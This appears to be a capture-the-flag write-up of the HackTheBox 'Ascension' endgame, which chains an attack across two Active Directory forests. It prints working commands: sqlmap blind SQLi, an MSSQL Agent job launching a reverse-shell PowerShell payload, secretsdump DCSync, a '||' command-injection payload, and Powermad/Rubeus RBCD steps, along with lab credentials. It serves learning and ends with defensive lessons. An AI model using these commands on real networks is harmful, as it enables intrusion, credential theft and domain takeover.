---
title: "Ascension"
date: 2020-02-13
type: docs
tags:
  - htb
  - endgame
  - active-directory
  - multi-forest
  - blind-sqli
  - sqlmap
  - mssql
  - execute-as
  - sql-agent-job
  - proxy-account
  - dpapi
  - dsrm
  - dcsync
  - forest-trust
  - thycotic-secret-server
  - command-injection
  - rbcd
  - rubeus
  - s4u
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox , **Endgame** (7 flags, two AD forests: `daedalus.local` and `megaairline.local`), **Released:** 2020-02-13, entry point `10.13.38.20`

</div>

<div class="callout callout-abstract">

**Attack Path (7 flags)**

1. **WEB01** , `book-trip.php` `destination` param is **blind SQLi** against MSSQL. The web login (`daedalus`) can **`EXECUTE AS` `daedalus_admin`**, who holds the SQLAgent roles. Create a **SQL Server Agent job** with a `CmdExec` step running under a **proxy account** , shell as `IIS APPPOOL\DefaultAppPool`. **Flag 1**.
2. Enumerate the host: a scheduled task and LSASS/DPAPI give **`DAEDALUS\billing_user`** (local admin on WEB01) and the MSSQL service account. WinRM as `billing_user`. **Flag 2**.
3. A mounted backup drive holds the **DSRM** password for `DC1`, and DPAPI decrypts the **Domain Admin** password (`pleasefastenyourseatbelts01!`). `secretsdump.py` with DSRM (or DA) dumps NTDS. **Flags 3 to 4** on `DC1`.
4. `daedalus.local` has a **forest trust** to `megaairline.local`. `DAEDALUS\elliot`'s cracked NTLM password (`84@m!n@9`) is valid there.
5. **MS01** runs **Thycotic Secret Server**. `AdminScripts.aspx` has **command injection** (`foo || <cmd> || bar`). **Flag 5**.
6. On MS01: Slack IndexedDB and DPAPI give `LetMeInAgain!` and `MEGAAIRLINE\anna : FWErfsgt4ghd7f6dwx` (reused for local admin). **Flag 6**.
7. As `anna`: **RBCD** attack , `Powermad` adds a machine account, `Set-DomainRBCD` on `DC2`, `Rubeus s4u` impersonates administrator , DCSync `DC2`. **Flag 7**.

</div>

<div class="callout callout-key">

**Credentials (recovered along the way)**


| Account | Value |
| --- | --- |
| `daedalus` (web SQL login) , can impersonate `daedalus_admin` | |
| `DAEDALUS\Administrator` (DPAPI) | `pleasefastenyourseatbelts01!` |
| DSRM (DC1) | `kF4df76fj*JfAcf73j` |
| `DAEDALUS\elliot` (cracked) | `84@m!n@9` |
| `MEGAAIRLINE\anna` | `FWErfsgt4ghd7f6dwx` |

</div>

---

## Overview

Ascension is the "airline" endgame, and it's easily one of the densest chains I've worked through: a full red-team style engagement across **two separate forests**, all kicked off by a single blind SQL injection on a booking form. What made this box worth the time investment wasn't any one exploit being clever, it was how many disciplines I had to touch to carry the chain forward. I went from **MSSQL `EXECUTE AS` impersonation** and **SQL Agent proxy jobs** (a way to get RCE without ever touching `xp_cmdshell`), into **DPAPI** credential recovery, abuse of the **DSRM** account, a full **NTDS** extraction, **forest trust** enumeration across the two domains, a command injection in a real commercial product (**Thycotic Secret Server**), credential scraping from browser and chat storage, and finally **Resource-Based Constrained Delegation** to take the second DC. Every stage fed the next: nothing here was a dead end, and that's what made it feel like a genuine engagement rather than a series of disconnected puzzles. My personal takeaway going in was that this is a masterclass in "one small bug, patient enumeration, total compromise", and by the end I believed it.

I've since run into MSSQL abuse and DCSync finishes on plenty of other boxes, so it's worth cross-referencing: the impersonation and agent-job technique shows up again on [EscapeTwo](/writeups/hackthebox/windows/easy/escapetwo/) and [Crocc Crew](/writeups/tryhackme/windows/insane/crocc-crew/), the DCSync-style finish rhymes with [VulnNet Roasted](/writeups/tryhackme/windows/medium/vulnnet-roasted/), [Attacktive Directory](/writeups/tryhackme/windows/medium/attacktive-directory/), and [Reset](/writeups/tryhackme/windows/hard/reset/), and the RBCD/S4U delegation abuse I used to close this one out is the same core idea I applied again on [Enterprise](/writeups/tryhackme/windows/hard/enterprise/).

---

## Full Walkthrough

### Stage 1, WEB01 , blind SQLi to RCE

The entry point is "Daedalus Airlines", an IIS-hosted booking site. I started by poking at the trip-booking form, and the `destination` parameter on `book-trip.php` stood out as the most likely candidate for injection since it clearly gets passed straight into a query. Manual testing confirmed it was blind, and the backend responding with MSSQL-flavored error timing told me which engine I was dealing with before I even reached for automation.

```bash
sqlmap -r booktrip.req -p destination --dbms mssql --batch --level 3 --risk 3
sqlmap -r booktrip.req -p destination --dbms mssql --dbs
# daedalus, logs, master, model, msdb, tempdb
```

<div class="callout callout-note">

**From SQLi to a shell without xp_cmdshell**

My first instinct once I had a SQL injection point was to reach for `xp_cmdshell`, the classic path to command execution on MSSQL. That was locked down, and so was `xp_dirtree`, so I had to think about what else the compromised login could actually do. Querying `sys.server_permissions` turned up something more interesting: the web application's login, `daedalus`, holds **`IMPERSONATE`** rights on another login, `daedalus_admin`. That second account turned out to be a member of `SQLAgentUserRole` and `SQLAgentOperatorRole`, which meant it could create and run SQL Server Agent jobs. That's a well-documented technique (Optiv wrote it up as "MSSQL Agent Jobs for Command Execution") for turning Agent job steps into arbitrary command execution, so I chased it:
```sql
EXECUTE AS LOGIN = 'daedalus_admin';
EXEC msdb.dbo.sp_help_proxy;                       -- find a proxy account
EXEC msdb.dbo.sp_add_job @job_name = 'x';
EXEC msdb.dbo.sp_add_jobstep @job_name='x', @step_name='s',
     @subsystem='CmdExec', @proxy_name='<proxy>',
     @command='powershell -e <b64 reverse shell>';
EXEC msdb.dbo.sp_add_jobserver @job_name='x';
EXEC msdb.dbo.sp_start_job @job_name='x';
```
Once the job kicks off, SQL Server Agent runs the `CmdExec` step under whatever credential the proxy account carries, and my base64-encoded PowerShell payload fires as a result. That got me **Flag 1**, executing as `IIS APPPOOL\DefaultAppPool`, an unprivileged IIS context but a foothold nonetheless.

</div>

### Stage 2, WEB01 local admin

With a shell in hand as the app pool identity, the next priority was privilege escalation on the host itself. I ran `Seatbelt` and `Inveigh` to sweep for anything interesting sitting in scheduled tasks, services, or cached credentials, and it paid off: a scheduled task referencing another host, `FIN01`, was carrying stored credentials for **`DAEDALUS\billing_user`**, who turned out to be a local administrator on WEB01. In parallel, dumping LSASS and running `SharpDPAPI` against the box surfaced the MSSQL service account's credentials along with several Credential Manager entries, more than one path forward, but `billing_user` was the cleanest.

```bash
evil-winrm -i web01.daedalus.local -u billing_user -p '<pw>'
```

That local admin credential was enough to get an interactive session, netting **Flag 2**.

### Stage 3, DC1 , DSRM and DPAPI to Domain Admin

With local admin on WEB01 secured, I turned to enumerating anything domain-adjacent that host might expose. Running `winPEAS` turned up a mounted backup drive, the kind of thing that's easy to overlook but often holds exactly what you need, and sure enough it contained the **DSRM** administrator password for `DC1`. That wasn't the only prize on the host: decrypting a stored DPAPI blob handed me the **Domain Admin** password outright, `pleasefastenyourseatbelts01!`. Between the two, I had multiple independent routes to full domain compromise.

<div class="callout callout-note">

**DSRM as a local admin**

What makes the DSRM password valuable is a fact a lot of defenders overlook: the Directory Services Restore Mode account is a *local* administrator on the domain controller, entirely separate from the domain's own privilege model. Normally that account is only usable at boot time from the DC's local console, but if the registry key `HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior` is set to `2`, the DC will happily accept that credential for authentication over the network like any other local admin account. Once I confirmed that setting, running `secretsdump` against it was the obvious next move:
```bash
secretsdump.py -just-dc 'daedalus.local/administrator@dc1.daedalus.local'
```

</div>

That dump gave me **Flags 3 and 4** off `DC1`, and, more importantly for the chain, a full NTDS copy of `daedalus.local`.

### Stage 4, the forest trust

Owning one forest root is a natural point to ask whether the compromise extends any further, and the box's premise ("two forests: `daedalus.local` and `megaairline.local`") made me suspect a trust relationship right away. I loaded PowerView and mapped it out directly rather than guessing:

```powershell
Import-Module PowerView.ps1
Get-DomainTrust ; Invoke-MapDomainTrust
# daedalus.local <--> megaairline.local  (forest, transitive)
```

That confirmed a transitive forest trust between the two domains, which meant any credential valid in one could potentially be used against the other. Going back through the NTDS dump from DC1, I pulled `DAEDALUS\elliot`'s NTLM hash (`74fdf381a94e1e446aaedf1757419dcd`) and threw it at a cracking rig, which recovered the plaintext `84@m!n@9`. Password reuse across the trust boundary meant that credential carried straight over into `megaairline.local`, giving me a foothold in the second forest without any additional exploitation.

### Stage 5, MS01 , Thycotic Secret Server command injection

From here I needed network access into the second forest's internal range, so I tunneled into `192.168.11.0/24` using Neo-reGeorg and chisel. Enumerating that subnet turned up `MS01.megaairline.local`, which was running **Thycotic Secret Server**, a credential vaulting product that, if I could compromise it, would likely hand me a treasure trove of stored secrets. Digging through its functionality, I found that the SSH script editor page, `AdminScripts.aspx`, passes a parameter into a shell command without sanitizing it first:

```
foo || powershell -e <b64 whoami> || bar
```

<div class="callout callout-note">

**`||` command injection**

The vulnerable code takes whatever I supply and drops it straight into a shell command string joined together with `||` operators, no sanitization in between. That structure is easy to abuse once you see it: the leading `foo` token fails harmlessly, the first `||` then executes whatever command I place next since the prior stage returned non-zero, and the trailing `|| bar` just absorbs the rest of the line so the application doesn't choke on unexpected output. With that primitive confirmed, reading the flag directly off disk was trivial: `type c:\users\elliot\desktop\flag.txt` got me **Flag 5**.

</div>

### Stage 6, MS01 local admin

With command execution on MS01, I went hunting for local privilege escalation material the same way I had on WEB01, checking browser and chat application storage since users on this box clearly had habits worth exploiting. Picking apart the Chrome IndexedDB store and a Slack data blob recovered a plaintext password, `LetMeInAgain!`. Running `SharpDPAPI` against the host's protected data added a second credential to the pile: `MEGAAIRLINE\anna : FWErfsgt4ghd7f6dwx`. That one turned out to be reused for the local Administrator account, which was the more useful of the two finds.

I used it to get an interactive session over RDP/WinRM as the local admin, which handed me **Flag 6**.

### Stage 7, DC2 , RBCD

Local admin on MS01 as `anna` wasn't the end goal, DC2 was, so I looked at what `anna`'s privileges allowed against domain objects. She had write access to a computer object's delegation attribute, which is exactly the primitive Resource-Based Constrained Delegation abuse needs. Working through it as `anna`:

```powershell
# 1. add a machine account we control
.\Powermad.ps1; New-MachineAccount -MachineAccount iLovePizza -Password (ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force)
# 2. configure DC2 to trust it for delegation
Set-DomainRBCD -Identity DC2 -DelegateFrom iLovePizza
# 3. impersonate administrator to a DC2 service
.\Rubeus.exe hash /password:Passw0rd! /user:iLovePizza
.\Rubeus.exe s4u /user:iLovePizza$ /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/dc2.megaairline.local /ptt
```

<div class="callout callout-note">

**RBCD**

The logic behind this attack is worth spelling out because it's not obvious the first time you see it: if you hold write access to `msDS-AllowedToActOnBehalfOfOtherIdentity` on a target computer object, which is exactly what `anna` had over `DC2`, you can point that attribute at a principal you control. Once that's set, the target machine trusts your principal to act on behalf of anyone when requesting service tickets to itself. Chaining S4U2self and S4U2proxy through `Rubeus s4u` lets you request a service ticket to that computer **impersonating any user you like**, and I obviously chose `administrator`. A `cifs`, `host`, or `ldap` ticket to `DC2` under that identity is enough to run a DCSync straight off the domain controller.

</div>

Putting the RBCD chain together in practice meant first controlling a machine account, then pointing DC2's delegation at it, and finally minting the impersonated ticket, which is exactly the three commands above. With that ticket in hand, pulling every domain hash was a formality:

```bash
secretsdump.py -k -no-pass dc2.megaairline.local -just-dc
wmiexec.py -hashes :<admin hash> 'megaairline.local/administrator@dc2.megaairline.local'
```

That DCSync closed out the chain and handed me **Flag 7**. At that point both forest roots were owned end to end, from a single blind SQL injection all the way to Domain Admin on two separate forests.

---

## Loot

Seven flags across `WEB01`, `DC1` (x2), `MS01` (x2), and `DC2`. See the Attack Path table for which stage yields which.

---

## Lessons and Takeaways

Working through Ascension end to end left me with a much sharper sense of how a single low-severity finding can cascade into a full enterprise compromise when nothing along the way is independently hardened. A few things stood out enough that I want to call them out explicitly:

- **Parameterize every query, no exceptions.** The entire chain, two forests, seven flags, root on two domain controllers, traces back to one unsanitized `destination` parameter on a booking form. That's the lesson I keep relearning on these boxes: input validation is cheap, and the cost of skipping it compounds fast.
- **Treat `IMPERSONATE` grants on SQL logins as equivalent to handing out that account's full privilege set.** I didn't need `xp_cmdshell` at all once I found that `daedalus` could impersonate `daedalus_admin`. Combine impersonation with SQL Agent job creation rights and you have RCE that never touches the extended stored procedures defenders usually watch for. Locking down who can create and run Agent jobs, and auditing impersonation grants regularly, would have closed this off entirely.
- **Remember that DSRM is a local administrator account on every domain controller it exists on.** It's easy to forget about because it's rarely used, but `DsrmAdminLogonBehavior` defaulting to anything other than `0` opens up network authentication with it. Vault that password properly and don't leave it sitting on a mounted backup share.
- **Assume DPAPI-protected secrets are recoverable by anyone with local admin or SYSTEM on the host.** DPAPI is designed to stop remote attackers and casual snooping, not a fully compromised machine. Any credential a user or service has ever typed, saved, or cached on that box should be treated as already exposed once an attacker reaches that privilege level.
- **Forest trusts extend your attack surface, not just your authentication scope.** The trust between `daedalus.local` and `megaairline.local` meant that password reuse (`elliot`'s cracked NTLM working on the far side of the trust) collapsed a boundary that looked, on paper, like a hard security edge. Trusts need the same scrutiny as the domains they connect.
- **Audit write access to `msDS-AllowedToActOnBehalfOfOtherIdentity` religiously.** RBCD abuse is quiet, doesn't require any special group membership beyond that one write privilege, and ends in impersonating Domain Admin. Regularly review who can write to that attribute on any computer object, especially domain controllers.
- **Harden and isolate PAM and credential-vaulting products like Secret Server the same way you'd harden a domain controller.** A command injection in the one application whose entire purpose is holding every other credential in the environment is about as bad as a single bug can get, because compromising it doesn't just give you one foothold, it gives you the keys to everything else the product was protecting.

---

## Related Writeups

- **MSSQL impersonation / agent jobs / xp_cmdshell:** [EscapeTwo](/writeups/hackthebox/windows/easy/escapetwo/), [Crocc Crew](/writeups/tryhackme/windows/insane/crocc-crew/)
- **DPAPI / DSRM / NTDS extraction:** [VulnNet Roasted](/writeups/tryhackme/windows/medium/vulnnet-roasted/), [Reset](/writeups/tryhackme/windows/hard/reset/)
- **DCSync:** [Attacktive Directory](/writeups/tryhackme/windows/medium/attacktive-directory/), [VulnNet Roasted](/writeups/tryhackme/windows/medium/vulnnet-roasted/)
- **RBCD / S4U constrained delegation:** [Enterprise](/writeups/tryhackme/windows/hard/enterprise/)
- **Forest / domain trust abuse:** [Crocc Crew](/writeups/tryhackme/windows/insane/crocc-crew/)

## References

- HTB Ascension (snovvcra.sh) <https://snovvcra.sh/2024/04/30/htb-ascension.html>
- HTB Ascension (byte-mind.net) <https://byte-mind.net/hackthebox-endgames-ascension-writeup/>
- MSSQL Agent Jobs for Command Execution (Optiv) <https://www.optiv.com/insights/source-zero/blog/mssql-agent-jobs-command-execution>
- Wagging the Dog (RBCD, Elad Shamir) <https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html>
- Final chain steps (MS01 through the DC2 finish) cross-referenced against public writeups for this box.
